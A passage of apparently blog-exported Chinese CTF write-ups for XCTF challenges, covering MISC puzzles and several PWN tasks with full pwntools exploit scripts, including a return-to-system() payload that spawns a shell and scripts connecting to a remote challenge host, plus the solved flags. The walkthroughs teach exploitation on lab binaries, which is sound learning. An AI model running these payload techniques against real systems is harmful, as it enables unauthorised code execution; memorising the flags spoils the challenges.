alt="攻防世界-适合作为桌面3.png"><br>有很多乱码，但是可以看到有不少 <code>&#39;&#123;&#125;&#39;</code>、<code>&#39;()&#39;</code>，感觉像是代码<br>结合可以看到 <code>1.pyt</code>、<code>1.pyR</code>，可能与 python 的反编译文件有关</p></li><li><p><mark>将这一串十六进制数据，用 WinHex 粘贴进去：</mark><br><img src="https://s2.loli.net/2023/03/18/XUlxiYBTD5ouNIa.png" alt="攻防世界-适合作为桌面4.png"><br><mark>并另存为一个新的文件，后缀名改为 .pyc，得到 1.pyc：</mark><br><img src="https://s2.loli.net/2023/03/18/KmFy8HMwlX9uUhE.png" alt="攻防世界-适合作为桌面5.png"></p></li><li><p>通过在线 pyc 反编译该文件：<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a><br><img src="https://s2.loli.net/2023/03/18/Anm2M9i7EVdkQHB.png" alt="攻防世界-适合作为桌面6.png"><br>反编译成功，得到代码：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit https://tool.lu/pyc/ for more information</span><span class="token comment"># Version: Python 2.7</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span> flag</code></pre></li><li><p>发现是一段打印 flag 的代码，稍作修改，直接运行即可：<br><img src="https://s2.loli.net/2023/03/18/FcNdRGiqjLWhAwI.png" alt="攻防世界-适合作为桌面7.png"><br>得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{38a57032085441e7}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-glance-50</title>
      <link href="/2023/033771dc4a.html"/>
      <url>/2023/033771dc4a.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 <mark>gif 图片的拆分和拼接</mark></p></li><li><p><mark>拆分网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a> 可以直接将帧拼接起来，方便直接看到每一帧拼接起来的原图</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/9266eadf353d4ada94ededaeb96d0c50.gif">攻防世界-glance-50</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>得到一张 gif 动态图片：<br><img src="https://s2.loli.net/2023/03/18/r9OXUAWfM61IxDq.png" alt="攻防世界-glance-50 1.png"></p></li><li><p>由于图画很窄，尝试修改宽度无果，在 Ubuntu 中分析也没有发现</p></li><li><p>根据以往经验，gif 大概率是需要拆分的，于是将 gif 文件拆分成帧图片：<br><a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a><br><img src="https://s2.loli.net/2023/03/18/Teni6gfAUGdj17m.png" alt="攻防世界-glance-50 2.png"><br>使用这个网站可以直接将拆分后的图片集中展示出来，可以直接得到 flag</p></li><li><p>这个题其实就是将藏有 flag 的图片拆分为一段一段的，然后将每一个片段作为一帧合成 gif 动态图。所以直接将 gif 拆分为帧后，再拼接起来即可</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>使用网站分离得到帧图片：<br><img src="https://s2.loli.net/2023/03/18/w2R4XhJYeTWGbFm.png" alt="攻防世界-glance-50 3.png"></p></li><li><p>在 Win 下安装 <code>ImageMagick</code> ：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a><br>在帧图片文件夹下打开 cmd，执行 <code>magick montage *.png -tile 201x1 -geometry +0+0 flag.png</code><br>得到一张拼接的图片 flag.png：<br><img src="https://s2.loli.net/2023/03/18/D6zMQW2Gl9dk3Yw.png" alt="攻防世界-glance-50 4.png"><br>根据图片内容获得 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>TWCTF{Bliss by Charles O’Rear}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-guess_num</title>
      <link href="/2023/03778b1d8e.html"/>
      <url>/2023/03778b1d8e.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>栈溢出漏洞</mark></p></li><li><p>通过 <mark>Python 实现 C 语言函数的运行</mark>，利用 <code>ctypes</code> 库和 <code>cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></p></li><li><p>通过<mark>编写脚本来 PWN 通程序中函数的逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/b59204f56a0545e8a22f8518e749f19f">攻防世界-guess_num</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/2CcvqlkIjt4hr5z.png" alt="攻防世界-guess_num1.png"><br>64位 小端序，金丝雀、栈不可执行、地址随机化全都开启</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/3YjyBQtAL4XceOZ.png" alt="攻防世界-guess_num2.png"></p></li><li><p>打开 IDA 分析：<br><img src="https://s2.loli.net/2023/03/18/c1xPTpAjw3eWyXG.png" alt="攻防世界-guess_num3.png"><br>发现随机数种子 <code>seed</code>，且存在 <code>gets()</code> 这种明显的漏洞函数<br>函数 <code>sub_BB0()</code> 用来生成随机数种子：<br><img src="https://s2.loli.net/2023/03/18/opRS6GCUDQiTyf3.png" alt="攻防世界-guess_num4.png"><br>在 <code>puts(&quot;Success!&quot;)</code> 后执行了函数 <code>sub_C3E()</code>，跟进：<br><img src="https://s2.loli.net/2023/03/18/NzqhCAxUBao1Yw6.png" alt="攻防世界-guess_num5.png"><br>该函数会执行 <code>system(&quot;cat flag&quot;)</code>，说明只要让这个函数执行就可以得到 flag，即：保持 <code>for</code> 循环不会中途退出</p></li><li><p>分析 <code>for</code> 循环的逻辑：总共循环 10 次，并且每次循环会根据 <code>v6 = rand() % 6 + 1</code> 生成一个随机数 <code>v6</code>，然后让用户输入一个 <code>v4</code>，只有当 <code>v4 == v6</code> 才能让循环继续下去</p></li><li><p>观察栈中数据的位置：<br><img src="https://s2.loli.net/2023/03/18/xCtyGoNTp7OVUs2.png" alt="攻防世界-guess_num6.png"><br><mark>发现用户输入的 <code>v7</code> 在随机数种子 <code>seed</code> 的上方，而且用户的输入在函数 <code>sub_BB0()</code> 生成随机数种子的操作之后，因此可以通过将 <code>v7</code> 溢出从而修改随机数种子 <code>seed</code> 的值，这样就可以得到 <code>v6 = rand() % 6 + 1</code> 所产生的所有伪随机数，之后编写脚本将所有产生的 <code>v6</code> 作为输入发送过去，就可以实现猜中所有的随机数了</mark></p></li><li><p><strong>注意，在 Python 中，可以通过 <code>from ctypes import *</code> 引入 C 语言库，用 <code>lib = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code>  导入 C 运行库，就可以使用 <code>lib</code> 来执行 C 语言的函数了</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">global</span> io<span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 根据ida的伪代码，先将种子设为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数，即:v6 = rand() % 6 + 1;</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess_num"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">49792</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 填充垃圾字符，并将seed覆盖为1</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 第一次输入，可随便输入</span>    srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 执行srand函数保证每次都能猜中</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{a1d36b526f5cc7080c63a2338ee0255b}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/1nLR25tdK3Wk8Ne.png" alt="攻防世界-guess_num7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-cgpwn2</title>
      <link href="/2023/03c1457cf4.html"/>
      <url>/2023/03c1457cf4.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><em><strong>当程序中没有后门函数时</strong></em>：<br><mark>可以通过向段中写入 <code>&quot;/bin/sh&quot;</code>，然后通过栈溢出调用 <code>system()</code> 函数将写入的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</mark></p></li><li><p><mark>在调用 <code>system()</code> 函数时，<strong>若想要向其传入参数</strong>，注意填充 <strong>4个 字节</strong> 的数据来平衡栈</mark>，<strong>因为调用 <code>system()</code> 函数的时候要压入一个返回地址</strong>【<em>有时候直接写 p32(0) 也可以，这也是一个 4字节 的数据</em>】</p></li></ul><blockquote><p>为什么要填充 4个 字节？</p></blockquote><ol><li>当程序调用 <code>system()</code> 函数时，会自动去寻找栈底，即 <code>ebp</code> 指向的位置，然后将 <code>ebp+8 字节</code> 的位置的数据当作函数的参数</li><li>如果想将 <code>/bin/sh</code> 作为 <code>system()</code> 函数的参数，就可以在栈溢出的时候，先修改 <code>eip</code> 为 <code>system()</code> 函数的地址，然后填充 <code>4个字节</code> 的垃圾数据，再将 <code>/bin/sh</code> 的地址写入栈上，这样调用 <code>system()</code> 函数的时候，就可以将 <code>/bin/sh</code> 作为参数，然后返回一个 <code>shell</code></li><li>为什么是在 <code>eip</code>【即 <code>system()</code> 函数地址】后面覆盖 <code>4个字节</code> 垃圾数据而不是前面提到的 <code>8个字节</code>？<br> 这是因为当调用 <code>system()</code> 函数的时候，在 <code>system()</code> 函数中会首先执行 <code>push ebp</code> 指令，将 <code>4字节</code> 的 <code>ebp</code> 地址压入栈中，而此时的栈底距离参数 <code>/bin/sh</code> 正好 <code>8字节</code>，所以应该填充 <code>4字节</code> 垃圾数据<br><img src="https://s2.loli.net/2023/03/18/SoGkB1pXuNM9Hvh.png" alt="攻防世界-cgpwn2 0.png"></li></ol><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f">攻防世界-cgpwn2</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/47GXA5cqQbWhKH6.png" alt="攻防世界-cgpwn2 1.png"><br>32位 小端序，只开启了栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/85zA6Mwbg9ctLRG.png" alt="攻防世界-cgpwn2 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/k1HcRSt3fLjVKux.png" alt="攻防世界-cgpwn2 3.png"><br>跟进 <code>hello()</code>：<br><img src="https://s2.loli.net/2023/03/18/Ofux8XA2B39paIW.png" alt="攻防世界-cgpwn2 4.png"><br>有两个输入：<code>name</code> 和 <code>s</code>，查看 <code>name</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/Lmj7w5i6pVunSKo.png" alt="攻防世界-cgpwn2 5.png"><br>发现<mark>输入的 <code>name</code> 是存储在 <code>.bss</code> 段上的，不是在栈中</mark><br>查看 <code>s</code> 的写入位置：<br><img src="https://s2.loli.net/2023/03/18/PL1k2cOzNJFgUjS.png" alt="攻防世界-cgpwn2 6.png"><br>可以通过 <code>gets()</code> 函数溢出函数返回值，转而执行其他函数</p></li><li><p>发现后门函数：<br><img src="https://s2.loli.net/2023/03/18/83ULcImpSFXqCi9.png" alt="攻防世界-cgpwn2 7.png"><br>但是这个函数只是执行 <code>echo hehehe</code>，即：打印 <code>hehehe</code>，并不能提供 flag</p></li><li><p><mark>既然输入的 <code>name</code> 可以往 <code>.bss</code> 段上写入数据，因此可以考虑通过 <code>name</code> 往 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code>，然后再通过输入 <code>s</code> 将栈溢出，使程序调用 <code>system()</code> 函数，再将事先写入的 <code>&quot;/bin/sh&quot;</code> 做为 <code>system()</code> 函数的参数，即可 PWN 掉程序</mark></p></li><li><p>就是需要注意：调用 <code>system()</code> 函数后需要需要填充 <strong>4个字节</strong> 的垃圾数据来保持栈的平衡<br>因为调用 <code>system()</code> 函数的时候要压入一个返回地址，需要填充 <strong>4个 字节</strong>；<br>除写 <code>b&#39;a&#39; * 4</code> 之外，还可以写 <code>p32(0)</code>，也可以代表 <strong>4个 字节</strong></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取system函数的地址</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>  <span class="token comment"># s在.bss段上写入的地址，地址可以在ida中查看到，要往这里写入“/bin/sh”，然后用system函数调用它</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">65027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 通过栈溢出调用system函数</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个字节平衡栈，然后将写入“/bin/sh”的地址作为参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{d4336a51b8192c14138838a676822392}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/3VAoiOGqnNeypxU.png" alt="攻防世界-cgpwn2 8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-hello_pwn</title>
      <link href="/2023/03ab06d128.html"/>
      <url>/2023/03ab06d128.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>基础的<mark>栈溢出漏洞</mark></p></li><li><p>熟悉 <mark>exp 的编写</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282">攻防世界-hello_pwn</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/ulK38iMZRyt7GJX.png" alt="攻防世界-hello_pwn1.png"><br>64位 小端序，只开启了栈保护，没有金丝雀</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/EZ9ucXyBGk67rlS.png" alt="攻防世界-hello_pwn2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/rAhIFBY7SXEZRGt.png" alt="攻防世界-hello_pwn3.png"><br>通过 <code>read()</code> 从命令行向 <code>unk_601068</code> 的地址处写入 0x10 个值，如果 <code>dword_60106C == 1853186401</code>，就执行 <code>sub_400686()</code> 函数，跟进：<br><img src="https://s2.loli.net/2023/03/18/KwHTAj4QrixDSW6.png" alt="攻防世界-hello_pwn4.png"><br><code>sub_400686()</code> 函数直接 <code>cat flag.txt</code></p></li><li><p>因此，只需要将 <code>dword_60106C</code> 的值设置为 1853186401 就可以得到 flag<br>查看 <code>dword_60106C</code> 存放的位置：<br><img src="https://s2.loli.net/2023/03/18/FvESGUiWz3IsY5c.png" alt="攻防世界-hello_pwn5.png"><br>可以看到 read() 输入的值存放在 <code>unk_601068</code> 的地方就在 <code>dword_60106C</code> 的上方，而 read() 输入的长度为 0x10，因此只需在输入 <code>unk_601068</code> 时溢出修改 <code>dword_60106C</code> 的值即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hello_pwn"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">58615</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x60106C</span> <span class="token operator">-</span> <span class="token number">0x601068</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{ff873b571a60849c4df0f263789a392c}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/VawQFHjstdmD5Rk.png" alt="攻防世界-hello_pwn6.png"></p><p>执行了 <code>cat: flag.txt: 没有那个文件或目录</code>，说明本地已经 PWN 通，将 comtent 改为 0：<br><img src="https://s2.loli.net/2023/03/18/STH1NifdcrDQEOe.png" alt="攻防世界-hello_pwn7.png"><br>获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-level0</title>
      <link href="/2023/03ac22b62d.html"/>
      <url>/2023/03ac22b62d.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>经典<mark>栈溢出漏洞</mark></p></li><li><p><mark>修改函数跳转地址</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">攻防世界-level0</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/tqTzJC6NZrL2D4M.png" alt="攻防世界-level0 1.png"></p></li><li><p>尝试执行文件：<br><img src="https://s2.loli.net/2023/03/18/XCYvMSiHTmUrWQz.png" alt="攻防世界-level0 2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/4n3Aah9voLgqTwW.png" alt="攻防世界-level0 3.png"><br>首先通过 <code>write()</code> 输出 <code>Hello, World\n</code>，然后执行 <code>vulnerable_function()</code>，跟进：<br><img src="https://s2.loli.net/2023/03/18/MbtcfmFUpR9AosB.png" alt="攻防世界-level0 4.png"><br>通过 <code>read()</code> 输入 <code>0x200</code> 个字符</p></li><li><p>在 IDA 左侧发现一个 <code>callsystem()</code> 函数<br><img src="https://s2.loli.net/2023/03/18/sYOulEvC8ka51SJ.png" alt="攻防世界-level0 5.png"><br>用来执行 <code>system(&quot;/bin/sh&quot;)</code>，而通过正常的 <code>main()</code> 函数是无法执行这个 <code>callsystem()</code> 函数的，因此本题的目的是要想办法修改函数的返回值转而执行 <code>callsystem()</code> 函数</p></li><li><p>查看输入的 <code>buf</code> 在栈中的位置：<br><img src="https://s2.loli.net/2023/03/18/iZ97JXKqN2P6nVS.png" alt="攻防世界-level0 6.png"><br>这里的 <code>r</code> 就是 <code>ret</code>，代表函数的返回地点，因此通过输入 <code>buf</code> 的数据覆盖来修改 <code>r</code> 为 <code>callsystem()</code> 函数的地址，就可以使程序转而执行 <code>callsystem()</code> 函数<br><img src="https://s2.loli.net/2023/03/18/uzx8YQme69ioWyE.png" alt="攻防世界-level0 7.png"></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>     <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token 